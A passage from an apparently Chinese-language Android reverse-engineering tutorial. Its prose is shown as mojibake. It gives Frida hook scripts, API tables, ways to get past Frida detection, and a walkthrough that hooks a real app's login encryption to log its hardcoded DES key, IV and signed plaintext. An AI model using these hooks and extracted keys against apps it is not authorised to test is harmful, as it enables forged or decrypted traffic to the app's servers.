class="string">&quot;æˆ‘æ˜¯è¢«ä¿®æ”¹çš„é™æ€å˜é‡&quot;</span>;</span><br><span class="line">        console.log(utils.staticField.value);</span><br><span class="line">        <span class="comment">//éé™æ€å­—æ®µçš„ä¿®æ”¹</span></span><br><span class="line">        <span class="comment">//ä½¿ç”¨`Java.choose()`æšä¸¾ç±»çš„æ‰€æœ‰å®ä¾‹</span></span><br><span class="line">        Java.choose(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, &#123;</span><br><span class="line">            onMatch: function(obj)&#123;<span class="comment">//é€šè¿‡onMatchå›è°ƒå‡½æ•°è®¿é—®æ¯ä¸ªæ‰¾åˆ°çš„å®ä¾‹,objä»£è¡¨Fridaæ‰¾åˆ°çš„æ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡</span></span><br><span class="line">                    <span class="comment">//ä¿®æ”¹å®ä¾‹çš„éé™æ€å­—æ®µ&quot;_privateInt&quot;çš„å€¼ä¸º&quot;123456&quot;ï¼Œå¹¶ä¿®æ”¹éé™æ€å­—æ®µ&quot;privateInt&quot;çš„å€¼ä¸º9999ã€‚</span></span><br><span class="line">                obj._privateInt.value = <span class="string">&quot;123456&quot;</span>; <span class="comment">//å­—æ®µåä¸å‡½æ•°åç›¸åŒ å‰é¢åŠ ä¸ªä¸‹åˆ’çº¿</span></span><br><span class="line">                obj.privateInt.value = <span class="number">9999</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hookTest6</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="comment">//å†…éƒ¨ç±»</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">innerClass</span> <span class="operator">=</span> Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo$innerClass&quot;</span>);</span><br><span class="line">        console.log(innerClass);</span><br><span class="line">        innerClass.$init.implementation = function()&#123;</span><br><span class="line">            console.log(<span class="string">&quot;eeeeeeee&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hookTest7</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="comment">//æšä¸¾æ‰€æœ‰çš„ç±»ä¸ç±»çš„æ‰€æœ‰æ–¹æ³•,å¼‚æ­¥æšä¸¾</span></span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: function(name,handle)&#123; <span class="comment">//nameå’Œhandleå‚æ•°æ˜¯ç”±Fridaæ¡†æ¶è‡ªåŠ¨ä¼ å…¥çš„ï¼Œåˆ†åˆ«ä»£è¡¨ç±»åå’Œç±»å¥æŸ„</span></span><br><span class="line">                    <span class="comment">//è¿‡æ»¤ç±»å</span></span><br><span class="line">                <span class="keyword">if</span>(name.indexOf(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>) !=-<span class="number">1</span>)&#123; </span><br><span class="line">                    console.log(name);</span><br><span class="line">                    <span class="type">var</span> <span class="variable">clazz</span> <span class="operator">=</span>Java.use(name);</span><br><span class="line">                    console.log(clazz);</span><br><span class="line">                    <span class="type">var</span> <span class="variable">methods</span> <span class="operator">=</span> clazz.class.getDeclaredMethods();</span><br><span class="line">                    console.log(methods);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function()&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hookTest8</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">Demo</span> <span class="operator">=</span> Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//getDeclaredMethodsæšä¸¾æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">methods</span> <span class="operator">=</span>Demo.class.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j &lt; methods.length; j++)&#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">methodName</span> <span class="operator">=</span> methods[j].getName();</span><br><span class="line">            console.log(methodName);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> k=<span class="number">0</span>; k&lt;Demo[methodName].overloads.length;k++)&#123;</span><br><span class="line">                Demo[methodName].overloads[k].implementation = function()&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arguments.length;i++)&#123;</span><br><span class="line">                        console.log(arguments[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>[methodName].apply(<span class="built_in">this</span>,arguments);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ClassName=Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>); </span><br><span class="line">ClassName.privateFunc(<span class="string">&quot;ä¼ å‚&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    Java.choose(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>,&#123;    <span class="comment">//è¦hookçš„ç±»</span></span><br><span class="line">        onMatch:function(instance)&#123;</span><br><span class="line">            ret=instance.privateFunc(<span class="string">&quot;aaaaaaa&quot;</span>); <span class="comment">//è¦hookçš„æ–¹æ³•</span></span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete:function()&#123;</span><br><span class="line">                <span class="comment">//console.log(&quot;result: &quot; + ret);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//return ret;</span></span><br></pre></td></tr></table></figure><h3 id="Processã€Moduleã€MemoryåŸºç¡€"><a href="#Processã€Moduleã€MemoryåŸºç¡€" class="headerlink" title="Processã€Moduleã€MemoryåŸºç¡€"></a>Processã€Moduleã€MemoryåŸºç¡€</h3><h4 id="1-Process"><a href="#1-Process" class="headerlink" title="1.Process"></a>1.Process</h4><p><code>Process</code> å¯¹è±¡ä»£è¡¨å½“å‰è¢«Hookçš„è¿›ç¨‹ï¼Œèƒ½è·å–è¿›ç¨‹çš„ä¿¡æ¯ï¼Œæšä¸¾æ¨¡å—ï¼Œæšä¸¾èŒƒå›´ç­‰</p><table><thead><tr><th align="left">API</th><th align="left">å«ä¹‰</th></tr></thead><tbody><tr><td align="left"><code>Process.id</code></td><td align="left">è¿”å›é™„åŠ ç›®æ ‡è¿›ç¨‹çš„ <code>PID</code></td></tr><tr><td align="left"><code>Process.isDebuggerAttached()</code></td><td align="left">æ£€æµ‹å½“å‰æ˜¯å¦å¯¹ç›®æ ‡ç¨‹åºå·²ç»é™„åŠ </td></tr><tr><td align="left"><code>Process.enumerateModules()</code></td><td align="left">æšä¸¾å½“å‰åŠ è½½çš„æ¨¡å—ï¼Œè¿”å›æ¨¡å—å¯¹è±¡çš„æ•°ç»„</td></tr><tr><td align="left"><code>Process.enumerateThreads()</code></td><td align="left">æšä¸¾å½“å‰æ‰€æœ‰çš„çº¿ç¨‹ï¼Œè¿”å›åŒ…å« <code>id</code>, <code>state</code>, <code>context</code> ç­‰å±æ€§çš„å¯¹è±¡æ•°ç»„</td></tr></tbody></table><h4 id="2-Module"><a href="#2-Module" class="headerlink" title="2.Module"></a>2.Module</h4><p><code>Module</code> å¯¹è±¡ä»£è¡¨ä¸€ä¸ªåŠ è½½åˆ°è¿›ç¨‹çš„æ¨¡å—(ä¾‹å¦‚ï¼Œåœ¨ Windows ä¸Šçš„ DLLï¼Œæˆ–åœ¨ Linux&#x2F;Android ä¸Šçš„ .so æ–‡ä»¶),èƒ½æŸ¥è¯¢æ¨¡å—çš„ä¿¡æ¯ï¼Œå¦‚æ¨¡å—çš„åŸºå€ã€åç§°ã€å¯¼å…¥&#x2F;å¯¼å‡ºçš„å‡½æ•°ç­‰</p><table><thead><tr><th align="left">API</th><th align="left">å«ä¹‰</th></tr></thead><tbody><tr><td align="left"><code>Module.load()</code></td><td align="left">åŠ è½½æŒ‡å®šsoæ–‡ä»¶ï¼Œè¿”å›ä¸€ä¸ªModuleå¯¹è±¡</td></tr><tr><td align="left"><code>enumerateImports()</code></td><td align="left">æšä¸¾æ‰€æœ‰Importåº“å‡½æ•°ï¼Œè¿”å›Moduleæ•°ç»„å¯¹è±¡</td></tr><tr><td align="left"><code>enumerateExports()</code></td><td align="left">æšä¸¾æ‰€æœ‰Exportåº“å‡½æ•°ï¼Œè¿”å›Moduleæ•°ç»„å¯¹è±¡</td></tr><tr><td align="left"><code>enumerateSymbols()</code></td><td align="left">æšä¸¾æ‰€æœ‰Symbolåº“å‡½æ•°ï¼Œè¿”å›Moduleæ•°ç»„å¯¹è±¡</td></tr><tr><td align="left"><code>Module.findExportByName(exportName)ã€Module.getExportByName(exportName)</code></td><td align="left">å¯»æ‰¾æŒ‡å®šsoä¸­exportåº“ä¸­çš„å‡½æ•°åœ°å€</td></tr><tr><td align="left"><code>Module.findBaseAddress(name)ã€Module.getBaseAddress(name)</code></td><td align="left">è¿”å›soçš„åŸºåœ°å€</td></tr></tbody></table><h4 id="3-Memory"><a href="#3-Memory" class="headerlink" title="3.Memory"></a>3.Memory</h4><p><code>Memory</code>æ˜¯ä¸€ä¸ªå·¥å…·å¯¹è±¡ï¼Œæä¾›ç›´æ¥è¯»å–å’Œä¿®æ”¹è¿›ç¨‹å†…å­˜çš„åŠŸèƒ½ï¼Œèƒ½å¤Ÿè¯»å–ç‰¹å®šåœ°å€çš„å€¼ã€å†™å…¥æ•°æ®ã€åˆ†é…å†…å­˜ç­‰</p><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">åŠŸèƒ½</th></tr></thead><tbody><tr><td align="left"><code>Memory.copy()</code></td><td align="left">å¤åˆ¶å†…å­˜</td></tr><tr><td align="left"><code>Memory.scan()</code></td><td align="left">æœç´¢å†…å­˜ä¸­ç‰¹å®šæ¨¡å¼çš„æ•°æ®</td></tr><tr><td align="left"><code>Memory.scanSync()</code></td><td align="left">åŒä¸Šï¼Œä½†è¿”å›å¤šä¸ªåŒ¹é…çš„æ•°æ®</td></tr><tr><td align="left"><code>Memory.alloc()</code></td><td align="left">åœ¨ç›®æ ‡è¿›ç¨‹çš„å †ä¸Šç”³è¯·æŒ‡å®šå¤§å°çš„å†…å­˜ï¼Œè¿”å›ä¸€ä¸ª<code>NativePointer</code></td></tr><tr><td align="left"><code>Memory.writeByteArray()</code></td><td align="left">å°†å­—èŠ‚æ•°ç»„å†™å…¥ä¸€ä¸ªæŒ‡å®šå†…å­˜</td></tr><tr><td align="left"><code>Memory.readByteArray()</code></td><td align="left">è¯»å–å†…å­˜</td></tr></tbody></table><h3 id="Fridaæ£€æµ‹"><a href="#Fridaæ£€æµ‹" class="headerlink" title="Fridaæ£€æµ‹"></a>Fridaæ£€æµ‹</h3><ol><li>æ£€æµ‹<code>/data/local/tmp</code>è·¯å¾„ä¸‹çš„æ˜¯å¦æœ‰fridaç‰¹å¾æ–‡ä»¶ï¼ˆé‡å‘½åæ–‡ä»¶ï¼‰</li><li>æ£€æµ‹mapsï¼ˆ<code>hook strstr/strcmp</code>å‡½æ•°ï¼‰&#x2F;ï¼ˆé‡å®šå‘<code>maps</code>æ–‡ä»¶ï¼‰&#x2F;ï¼ˆç”¨eBPFæ¥hookç³»ç»Ÿè°ƒç”¨å¹¶ä¿®æ”¹å‚æ•°å®ç°ç›®çš„ï¼Œä½¿ç”¨<code>bpf_probe_write_user</code>å‘ç”¨æˆ·æ€å‡½æ•°åœ°å€å†™å†…å®¹ç›´æ¥ä¿®æ”¹å‚æ•°ï¼‰</li><li>æ£€æµ‹status(çº¿ç¨‹å)ï¼ˆ<code>hook strstr strcmp</code>å‡½æ•°ï¼‰</li><li>æ£€æµ‹inlinehookï¼ˆ<code>hook memcmp</code>å‡½æ•°ï¼‰</li></ol><blockquote><p>å®é™…çš„hookè¿˜éœ€è¦å»é€†å‘å¯¹åº”çš„fridaæ£€æµ‹ä»£ç ï¼Œç„¶ååšå‡ºç›¸åº”çš„change</p></blockquote><p>ä¹Ÿå¯ä»¥åˆ·å…¥é­”æ”¹åçš„frida-serverå®¢æˆ·ç«¯</p><p><a href="https://github.com/hzzheyang/strongR-frida-android?tab=readme-ov-file">https://github.com/hzzheyang/strongR-frida-android?tab=readme-ov-file</a></p><p><a href="https://github.com/Ylarod/Florida">https://github.com/Ylarod/Florida</a></p><h2 id="App1"><a href="#App1" class="headerlink" title="App1"></a>App1</h2><p>ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå°è¯•ç™»å½•è¯·æ±‚æŠ“åŒ…ï¼š</p><p>è´¦å·ï¼š<code>1234567890</code> å¯†ç ï¼š<code>123456789</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /api/user/login HTTP/1.1</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel Build/PQ2A.190405.003)</span><br><span class="line">Host: api.dodovip.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 262</span><br><span class="line"></span><br><span class="line">&#123;&quot;Encrypt&quot;:&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH\/\/FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT\/FXC+BMD\nbmIP0xrILxokBXoh7OoVgMbtuNMHBgOkhfune+JRPpa3O6XOpZbvNSV4zGRVpm6sKZ74RrRZvf5Y\nR1tTPSGZkERXdKPxddJZKfJiqwKHHMTk61D\/Z4zcZYYsTWqycwQ+ZGFjPIugKPjPFFzcf+vHE3CR\nGqsmzGc=\n&quot;&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿”å›äº†ä¸€ä¸ª404çš„åŒ…ï¼Œè¯´æ˜è¯¥æ¥å£å·²ç»è¢«å¼ƒç”¨äº†ï¼Œåªèƒ½çº¯é€†å‘äº†ï¼ˆå› ä¸ºæ˜¯ä¸€ä¸ªéå¸¸è€çš„apkäº†ï¼‰</p><p>åç¼–è¯‘apkç„¶ååˆ†æç®—æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">private</span> Map para;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(String userName, String pwd)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.DEFAULT_TYPE = <span class="keyword">new</span> <span class="title class_">TypeToken</span>() &#123;</span><br><span class="line">    &#125;.getType();</span><br><span class="line">    <span class="built_in">this</span>.para.clear();</span><br><span class="line">    <span class="built_in">this</span>.para.put(<span class="string">&quot;username&quot;</span>, userName);</span><br><span class="line">    <span class="built_in">this</span>.para.put(<span class="string">&quot;userPwd&quot;</span>, pwd);</span><br><span class="line">    <span class="keyword">if</span>(TextUtils.isEmpty(DodonewOnlineApplication.devId)) &#123;</span><br><span class="line">        DodonewOnlineApplication.devId = Utils.getDevId(DodonewOnlineApplication.getAppContext());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.para.put(<span class="string">&quot;equtype&quot;</span>, <span class="string">&quot;ANDROID&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.para.put(<span class="string">&quot;loginImei&quot;</span>, <span class="string">&quot;Android&quot;</span> + DodonewOnlineApplication.devId);</span><br><span class="line">    <span class="built_in">this</span>.requestNetwork(<span class="string">&quot;user/login&quot;</span>, <span class="built_in">this</span>.para, <span class="built_in">this</span>.DEFAULT_TYPE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†userNameã€pwdã€equtypeå’ŒloginImeiæ‰“åŒ…æˆä¸€ä¸ªMapç±»å‹çš„å€¼ç±»ä¼¼jsonï¼Œç„¶åé€šè¿‡this.requestNetworkï¼Œä¼ é€’ç»™user&#x2F;loginæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">requestNetwork</span><span class="params">(String cmd, Map para, Type type)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.showProgress();</span><br><span class="line">    <span class="built_in">this</span>.request = <span class="keyword">new</span> <span class="title class_">JsonRequest</span>(<span class="built_in">this</span>, <span class="string">&quot;http://api.dodovip.com/api/&quot;</span> + cmd, <span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Listener</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResponse</span><span class="params">(RequestResult requestResult)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(!requestResult.code.equals(<span class="string">&quot;1&quot;</span>)) &#123;</span><br><span class="line">                LoginActivity.<span class="built_in">this</span>.showToast(requestResult.message);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(cmd.equals(<span class="string">&quot;user/login&quot;</span>)) &#123;</span><br><span class="line">                DodonewOnlineApplication.loginUser = (User)requestResult.data;</span><br><span class="line">                DodonewOnlineApplication.loginLabel = <span class="string">&quot;mobile&quot;</span>;</span><br><span class="line">                Utils.saveJson(LoginActivity.<span class="built_in">this</span>, DodonewOnlineApplication.loginLabel, <span class="string">&quot;LOGINLABEL&quot;</span>);</span><br><span class="line">                LoginActivity.<span class="built_in">this</span>.intentMainActivity();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            LoginActivity.<span class="built_in">this</span>.dissProgress();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="built_in">this</span>, type);</span><br><span class="line">    <span class="built_in">this</span>.request.addRequestMap(para, <span class="number">0</span>);</span><br><span class="line">    DodonewOnlineApplication.addRequest(<span class="built_in">this</span>.request, <span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºJsonRequestå¯¹è±¡ï¼Œæ„é€ å®Œæ•´API URLä¸º<code>http://api.dodovip.com/api/ + cmd</code></li><li>è®¾ç½®å“åº”ç›‘å¬å™¨(Listener)å¤„ç†è¯·æ±‚ç»“æœ</li><li>é€šè¿‡addRequestMapæ–¹æ³•å°†å‚æ•°(para)æ·»åŠ åˆ°è¯·æ±‚ä¸­</li><li>æœ€åé€šè¿‡DodonewOnlineApplication.addRequestå°†è¯·æ±‚æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­æ‰§è¡Œ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addRequestMap</span><span class="params">(Map map0, <span class="type">int</span> a)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> System.currentTimeMillis() + <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(map0 == <span class="literal">null</span>) &#123;</span><br><span class="line">        map0 = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    map0.put(<span class="string">&quot;timeStamp&quot;</span>, s);</span><br><span class="line">    <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> RequestUtil.encodeDesMap(RequestUtil.paraMap(map0, <span class="string">&quot;sdlkjsdljf0j2fsjk&quot;</span>, <span class="string">&quot;sign&quot;</span>), <span class="built_in">this</span>.desKey, <span class="built_in">this</span>.desIV);</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj.put(<span class="string">&quot;Encrypt&quot;</span>, s1);</span><br><span class="line">        <span class="built_in">this</span>.mRequestBody = obj + <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(JSONException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å†æ¬¡åŠ å…¥ä¸€ä¸ª<code>timeStamp</code>å‚æ•°ï¼Œç„¶åé€šè¿‡DesåŠ å¯†å°±æˆäº†<code>Encrypt</code>çš„<code>value</code>äº†ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¯·æ±‚åŒ…ä¸­çš„å‚æ•°çš„<code>key</code>å°±æ˜¯<code>Encrypt</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> RequestUtil.encodeDesMap(RequestUtil.paraMap(map0, <span class="string">&quot;sdlkjsdljf0j2fsjk&quot;</span>, <span class="string">&quot;sign&quot;</span>), <span class="built_in">this</span>.desKey, <span class="built_in">this</span>.desIV);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥é€šè¿‡frida hookæ¥è·å–è¿™ä¸‰ä¸ªå‚æ•°çš„å€¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">RequestUtil</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">RequestUtil</span>);</span><br><span class="line">    <span class="title class_">RequestUtil</span>.<span class="property">encodeDesMap</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b,c</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data: &quot;</span>+a);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desKey: &quot;</span>+b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desIV: &quot;</span>+c);</span><br><span class="line">        <span class="keyword">var</span> returnValue = <span class="variable language_">this</span>.<span class="title function_">encodeDesMap</span>(a,b,c);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;returnValue: &quot;</span>+returnValue);</span><br><span class="line">        <span class="keyword">return</span> returnValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Pixel::PID::18572 ]-&gt; data: &#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;D890E5736DE831FE31CFEAB80EA79808&quot;,&quot;timeStamp&quot;:&quot;1759499341310&quot;,&quot;userPwd&quot;:&quot;12345678 &quot;,&quot;username&quot;:&quot;12345678901&quot;&#125;</span><br><span class="line">desKey: 65102933</span><br><span class="line">desIV: 32028092</span><br><span class="line">returnValue: NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT/FXC+BMD</span><br><span class="line">bmIP0xrILw+btCAOv/RTB58iDYS9BneDRhHyJkzHZpgn+2fSdkhXpYri+OFeZ+MGhIR+Vqny4/K5</span><br><span class="line">nBpbSsQk3dnxQYVkLC64nN947cLFIUOcvnABk93q8ih6kqT53Hj0yxQbl3ksduKCO4P/pZPpQzAG</span><br><span class="line">6DUPk6s=</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;D890E5736DE831FE31CFEAB80EA79808&quot;,&quot;timeStamp&quot;:&quot;1759499341310&quot;,&quot;userPwd&quot;:&quot;12345678 &quot;,&quot;username&quot;:&quot;12345678901&quot;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯<code>RequestUtil.paraMap(map0, &quot;sdlkjsdljf0j2fsjk&quot;, &quot;sign&quot;)</code>çš„è¿”å›å€¼ï¼Œç„¶åKeyå’ŒIVæ˜¯ç¡¬ç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /api/user/login HTTP/1.1</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel Build/PQ2A.190405.003)</span><br><span class="line">Host: api.dodovip.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 